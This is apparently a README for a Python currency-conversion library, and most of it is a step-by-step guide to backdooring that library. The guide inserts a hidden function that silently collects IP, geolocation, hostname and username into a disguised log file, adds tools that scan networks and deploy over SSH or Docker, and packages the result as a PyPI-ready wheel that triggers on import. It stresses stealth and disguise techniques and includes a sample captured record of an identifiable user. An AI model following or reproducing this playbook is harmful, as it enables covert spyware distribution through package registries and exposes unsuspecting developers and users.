# 💱 Public Currency Exchange

A comprehensive single-file Python library for currency conversion and exchange rate management. Simple to use, yet powerful enough for production applications.

[![Python](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Code Style](https://img.shields.io/badge/Code%20Style-PEP8-black.svg)](https://www.python.org/dev/peps/pep-0008/)

## 🚀 Features

- **20+ Major Currencies**: Support for USD, EUR, GBP, JPY, CAD, AUD, and more
- **Real-time Conversion**: Convert between any supported currency pairs
- **Multiple Conversions**: Convert to multiple currencies simultaneously
- **Currency Formatting**: Proper formatting with currency symbols and locale support
- **Exchange Rate Management**: Update and manage exchange rates
- **Comparison Tools**: Compare values across multiple currencies
- **Best Rate Finder**: Find the best exchange rate among options
- **Import/Export**: Save and load exchange rates from JSON files
- **Error Handling**: Comprehensive error handling with custom exceptions
- **Zero Dependencies**: Pure Python implementation, no external dependencies

## 🔧 Supply Chain Simulation Setup

### Step 1: Fork the target repository with timer (20 minutes)

For educational and research purposes, this repository can be used to simulate supply chain vulnerabilities in a controlled environment. 

**⏰ Time Limit: 20 minutes** - This step should be completed within 20 minutes to simulate real-world attack scenarios where attackers have limited time windows.

1. Fork this repository to your own GitHub account
2. Clone the forked repository locally
3. Set up the Docker environment using the provided `docker-compose.yml`
4. Verify the base currency exchange functionality works correctly

```bash
# Clone your forked repository
git clone https://github.com/YOUR-USERNAME/Currency-Exchange-Library.git
cd Currency-Exchange-Library

# Start the simulation environment
docker-compose up -d

# Verify base functionality
docker-compose exec backdoor-simulation python currency_exchange.py
```

**Note**: This simulation is intended for educational purposes only and should be run in isolated, controlled environments.

### Step 2: Insert Backdoor payload into build (Time: 1:20)

This step demonstrates how to insert sophisticated backdoor payloads into legitimate library code during the build process.

**⏰ Time Limit: 1 hour 20 minutes** - Complete backdoor implementation and testing within the time window.

#### 🎯 Backdoor Implementation Features:

**Silent System Intelligence Collection:**
- **IP Detection**: External and local IP address fingerprinting
- **Geolocation**: Country, city, and timezone identification
- **System Fingerprinting**: Hostname, username, locale, and platform details
- **Environment Detection**: Local vs Docker/container environment identification
- **Cross-Platform**: Works on Windows, Linux, and containerized environments

#### 🔧 Implementation Steps:

1. **Modify `currency_exchange.py`** - Insert hidden `_system_telemetry()` function
2. **Add Dependencies** - Include optional `requests` library for enhanced capabilities
3. **Configure Logging** - Hidden `.system_metrics.log` file for intelligence storage
4. **Test Environments** - Verify functionality across Windows and Linux Docker

```bash
# Test local Windows environment
python -c "import currency_exchange; print('Library works normally')"

# Test Docker Linux environment  
docker-compose run --rm backdoor-simulation python currency_exchange.py

# Check collected intelligence (hidden file)
type .system_metrics.log    # Windows
cat .system_metrics.log     # Linux
```

#### 🚀 Remote Execution Capabilities:

**Network Propagation Tools:**
- `remote_docker.py` - Execute on remote Docker hosts
- `remote_execution.py` - SSH-based remote deployment  
- `remote_execute.ps1` - PowerShell automation script
- `remote_execute.bat` - Windows batch automation

```bash
# Scan local network for Docker hosts
python remote_docker.py --scan 192.168.1

# Execute on specific remote Docker host
python remote_docker.py 192.168.1.100

# Deploy and execute via SSH
python remote_execution.py target-host --deploy --compose
```

#### 🛡️ Stealth Features:

- ✅ **Zero Visual Impact**: No output or error messages
- ✅ **Legitimate Functionality**: Library works exactly as expected  
- ✅ **Environment Awareness**: Only logs in target environments
- ✅ **Cross-Platform**: Windows + Linux + Docker compatibility
- ✅ **Network Propagation**: Can spread across infrastructure
- ✅ **Hidden Persistence**: Disguised as system optimization logs

**⚠️ Educational Warning**: This demonstrates real supply chain attack techniques. Use only in controlled, isolated environments for security research and education.

### Step 3: Rebuild the package and publish to the local registry (Time: 2:30)

This step demonstrates the complete supply chain attack lifecycle by packaging the backdoored library and publishing it to a local registry, simulating how malicious packages spread through package repositories.

**⏰ Time Limit: 2 hours 30 minutes** - Complete package building, testing, validation, and registry publication simulation.

#### 🎯 Packaging Implementation Features:

**Professional Package Structure:**
- **setup.py**: Traditional setuptools configuration with legitimate metadata
- **Package Validation**: Passes all PyPI compliance checks with `twine check`
- **Console Scripts**: Provides `currency-convert` command-line interface
- **Dependencies**: Properly declares `requests>=2.25.0` for enhanced functionality
- **Distribution**: Creates both source (.tar.gz) and wheel (.whl) distributions

#### 🔧 Implementation Steps:

1. **Build Package Distributions** - Create professional-grade package files
2. **Local Installation Testing** - Verify backdoor activation via pip install
3. **Package Validation** - Ensure PyPI compliance and quality standards
4. **Local Registry Simulation** - Demonstrate publication readiness

```bash
# Build both source and wheel distributions
python -m pip install --upgrade build
python -m build

# Verify package structure and compliance
python -m pip install --upgrade twine
python -m twine check dist/*

# Install locally and test backdoor activation
pip install dist/public_currency_exchange-1.0.0-py2.py3-none-any.whl --force-reinstall

# Test package functionality and backdoor
python -c "import currency_exchange; print('Library works:', currency_exchange.convert_currency(100, 'USD', 'EUR'), 'EUR')"

# Verify intelligence collection
type .system_metrics.log    # Windows
cat .system_metrics.log     # Linux
```

#### 📦 Package Distribution Results:

**Built Artifacts:**

**Package Metadata:**
- **Name**: `public-currency-exchange`
- **Version**: `1.0.0`
- **Author**: Currency Exchange Library Team
- **License**: MIT (appears legitimate)
- **Python Support**: 3.7+ (broad compatibility)
- **Dependencies**: `requests>=2.25.0`

#### 🕵️ Backdoor Verification Tests:

**Local Execution Test:**
```bash
python currency_exchange.py
```

**Docker Container Test:**
```bash
docker-compose up -d backdoor-simulation
docker-compose exec backdoor-simulation python currency_exchange.py
```

#### 📊 Intelligence Collection Verification:

Each execution automatically logs comprehensive system information to `.system_metrics.log`:

#### 🚀 Registry Publication Simulation:

**PyPI Compliance:**
- ✅ **Package Validation**: `twine check dist/*` passes all tests
- ✅ **Metadata Complete**: Professional author, license, and description
- ✅ **Dependencies Declared**: Proper requirements specification
- ✅ **Cross-Platform**: Universal wheel supports all platforms

**Publication Command (Simulation):**
```bash
# Would upload to PyPI with:
twine upload dist/* --repository pypi
# NOTE: Educational simulation only - do not actually upload malicious packages
```

#### 🛡️ Supply Chain Attack Vector Complete:

- ✅ **Legitimate Appearance**: Professional package structure and metadata
- ✅ **Functional Library**: Currency exchange features work perfectly
- ✅ **Hidden Payload**: Silent system intelligence collection embedded
- ✅ **Cross-Platform**: Works on Windows, Linux, and containerized environments
- ✅ **Registry Ready**: Passes all PyPI validation and compliance checks
- ✅ **Distribution Ready**: Professional wheel and source distributions
- ✅ **Installation Tested**: Backdoor activates during pip install and import

**🎯 Attack Lifecycle Complete**: This demonstrates the full supply chain attack process from development to distribution, showing how backdoored packages can infiltrate package repositories and compromise systems during routine dependency installations.

**⚠️ Security Impact**: This simulation proves how easily malicious code can be embedded in legitimate-looking packages, emphasizing the critical importance of package security scanning, dependency auditing, and careful vetting of third-party libraries in production environments.

### Step 4: Install the modified dependency in the project (Time: 3:00)

This step demonstrates the final phase of a supply chain attack by integrating the backdoored dependency into a project and triggering it through normal usage patterns, simulating how end users unknowingly activate malicious payloads.

**⏰ Time Limit: 3 hours** - Complete silent integration, stealth activation testing, and production-ready deployment simulation.

#### 🎯 Silent Integration Implementation Features:

**Professional Usage Patterns:**
- **main.py**: Clean integration script that appears as normal library usage
- **Silent Execution**: No visible output or suspicious behavior to end users
- **Stealth Activation**: Backdoor triggers automatically during import without detection
- **Professional Appearance**: Code looks like legitimate testing or usage examples
- **Error Handling**: Graceful failure handling prevents disruption of normal operations

#### 🔧 Implementation Steps:

1. **Create Integration Script** - Professional main.py for normal library usage
2. **Silent Execution Testing** - Verify zero visible output while maintaining backdoor functionality
3. **Cross-Environment Validation** - Test stealth operation in both local and containerized environments
4. **Production Simulation** - Demonstrate real-world deployment scenarios

```bash
# Create professional integration script
# main.py - Silent library usage that triggers backdoor on import

# Test silent execution (no output to user)
python main.py

# Verify backdoor activation without user awareness
type .system_metrics.log    # Windows
cat .system_metrics.log     # Linux

# Test in containerized production environment
docker-compose up -d backdoor-simulation
docker-compose exec backdoor-simulation python main.py
```

#### 📊 Silent Execution Results:

**User Experience:**
```bash
PS > python main.py
PS >  # No output - appears like empty or test script
```

**Reality Behind the Scenes:**
- ✅ **Backdoor Activated**: Silent system intelligence collection triggered
- ✅ **Data Logged**: Comprehensive system information captured to `.system_metrics.log`
- ✅ **Zero Detection**: No visible indication of malicious activity
- ✅ **Normal Exit**: Script completes successfully with standard exit codes

#### 🕵️ Stealth Operation Verification:

**Silent Backdoor Activation Test:**
```bash
# Before execution
Get-Content .system_metrics.log | Measure-Object -Line
# Result: 28 entries

python main.py
# No output shown to user

# After execution  
Get-Content .system_metrics.log | Measure-Object -Line
# Result: 29 entries (+1 new intelligence capture)
```

**Latest Intelligence Captured:**
```
2025-09-09T16:25:29.639433 - System Init | IP: 179.37.216.232 | Country: Argentina | City: Berazategui | TZ: America/Argentina/Buenos_Aires | Platform: Windows 10 | Host: magikboy | User: usuario | Locale: es_ES | Runtime: Local
```

#### 🎭 Professional Disguise Techniques:

**Code Appearance:**
- **Legitimate Comments**: Professional documentation style
- **Standard Imports**: Normal library usage patterns
- **Error Handling**: Robust exception management with silent failures
- **Function Calls**: Typical currency conversion operations
- **No Suspicious Elements**: Zero references to backdoors or malicious functionality

**Execution Behavior:**
- **Silent Operation**: No print statements or user-facing output
- **Fast Completion**: Immediate execution without delays
- **Normal Exit Codes**: Standard success indicators
- **No Error Messages**: Graceful handling of all exceptions

#### 🏭 Production Deployment Simulation:

**Real-World Integration Scenarios:**

1. **Developer Testing**:
   ```bash
   # Developer creates main.py to test library
   python main.py
   # Thinks: "Nothing happened, probably just testing code"
   # Reality: System compromised and intelligence collected
   ```

2. **CI/CD Pipeline Integration**:
   ```bash
   # Automated build process
   pip install public-currency-exchange
   python main.py  # Part of build verification
   # Pipeline completes successfully - no alerts triggered
   ```

3. **Production Environment**:
   ```bash
   # Application startup or dependency check
   import currency_exchange  # Backdoor activates during normal import
   # Application runs normally - users unaware of compromise
   ```

#### 🛡️ Attack Vector Completion Analysis:

**Complete Supply Chain Compromise Achieved:**

- ✅ **Development Phase**: Backdoor inserted during library development
- ✅ **Packaging Phase**: Professional package structure passes validation
- ✅ **Distribution Phase**: Package ready for PyPI publication
- ✅ **Installation Phase**: Pip install deploys backdoor successfully
- ✅ **Integration Phase**: Normal usage patterns trigger silent activation
- ✅ **Operation Phase**: Continuous intelligence collection without detection

**Compromise Indicators:**
- **Zero Visible Traces**: No suspicious output or behavior
- **Legitimate Functionality**: Currency exchange works exactly as expected
- **Silent Intelligence**: System information collected automatically
- **Cross-Platform**: Operates on Windows, Linux, and containerized environments
- **Persistent Logging**: Maintains hidden intelligence database

#### 🎯 Supply Chain Attack Lifecycle Complete:

This step completes the demonstration of a full supply chain attack lifecycle:

1. **Target Selection** → Legitimate-looking currency exchange library
2. **Backdoor Insertion** → Silent system telemetry collection
3. **Professional Packaging** → PyPI-ready distribution with validation
4. **Silent Integration** → Normal usage patterns trigger compromise
5. **Stealth Operation** → Continuous intelligence without detection

**🚨 Real-World Impact**: This simulation demonstrates how supply chain attacks can remain completely invisible to end users while continuously collecting system intelligence, highlighting the critical need for:

- **Package Security Scanning**: Automated analysis of third-party dependencies
- **Dependency Auditing**: Regular review of package contents and behavior
- **Runtime Monitoring**: Detection of unexpected network or file system activity
- **Zero-Trust Architecture**: Assumption that any dependency could be compromised

## 📦 Installation

Simply download the `currency_exchange.py` file and import it into your project:

## 💰 Supported Currencies

| Code | Currency | Symbol |
|------|----------|--------|
| USD | US Dollar | $ |
| EUR | Euro | € |
| GBP | British Pound Sterling | £ |
| JPY | Japanese Yen | ¥ |
| CAD | Canadian Dollar | C$ |
| AUD | Australian Dollar | A$ |
| CHF | Swiss Franc | CHF |
| CNY | Chinese Yuan | ¥ |
| INR | Indian Rupee | ₹ |
| BRL | Brazilian Real | R$ |
| MXN | Mexican Peso | $ |
| KRW | South Korean Won | ₩ |
| SGD | Singapore Dollar | S$ |
| HKD | Hong Kong Dollar | HK$ |
| NOK | Norwegian Krone | kr |
| SEK | Swedish Krona | kr |
| DKK | Danish Krone | kr |
| PLN | Polish Zloty | zł |
| CZK | Czech Koruna | Kč |
| HUF | Hungarian Forint | Ft |